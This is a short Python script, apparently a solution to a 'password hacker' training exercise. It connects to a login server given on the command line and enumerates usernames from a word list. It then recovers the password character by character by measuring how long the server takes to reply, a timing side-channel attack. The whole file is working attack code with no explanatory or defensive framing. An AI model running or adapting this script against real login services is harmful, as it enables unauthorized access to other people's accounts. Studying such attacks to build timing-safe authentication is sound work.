# write your code here
import sys
import socket
import json
from datetime import datetime

args = sys.argv
password_domain = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(48, 58)] + [chr(i) for i in range(65, 91)]

with socket.socket() as client_socket:
    host = args[1]
    port = int(args[2])

    address = (host, port)

    client_socket.connect(address)

    login = ""
    password = " "
    normal_interval = 0
    with open('/Users/fatih/pycharmprojects/password hacker/password hacker/task/hacking/logins.txt') as f:
        for log_in in f:
            login = log_in.strip('\n')
            client_socket.send(json.dumps({"login": login, "password": password}).encode())
            # tic = datetime.now()
            server_reply = json.loads(client_socket.recv(1024).decode())
            # tac = datetime.now()
            # normal_interval = tac - tic
            if server_reply["result"] == "Wrong password!":
                password = ""
                break

    for first_character in password_domain:
        client_socket.send(json.dumps({"login": login, "password": first_character}).encode())
        tic = datetime.now()
        server_reply = json.loads(client_socket.recv(1024).decode())
        tac = datetime.now()
        diff = tac - tic
        # if server_reply["result"] == "Exception happened during login":
        if server_reply['result'] == "Wrong password!":
            if diff.microseconds > 1000:
                password = first_character
                # print('first character', password)
                break

    for i in range(20):
        for character in password_domain:
            temp = password + character
            client_socket.send(json.dumps({"login": login, "password": str(temp)}).encode())
            tic = datetime.now()
            server_reply = json.loads(client_socket.recv(1024).decode())
            tac = datetime.now()
            diff = tac - tic
            # if server_reply["result"] == "Exception happened during login":
            if server_reply['result'] == "Wrong password!":
                if diff.microseconds > 1000:
                    password = temp
                    # print('other characters', password)
            if server_reply['result'] == "Connection success!":
                password = temp

                print(json.dumps({"login": login, "password": password}))
                exit()
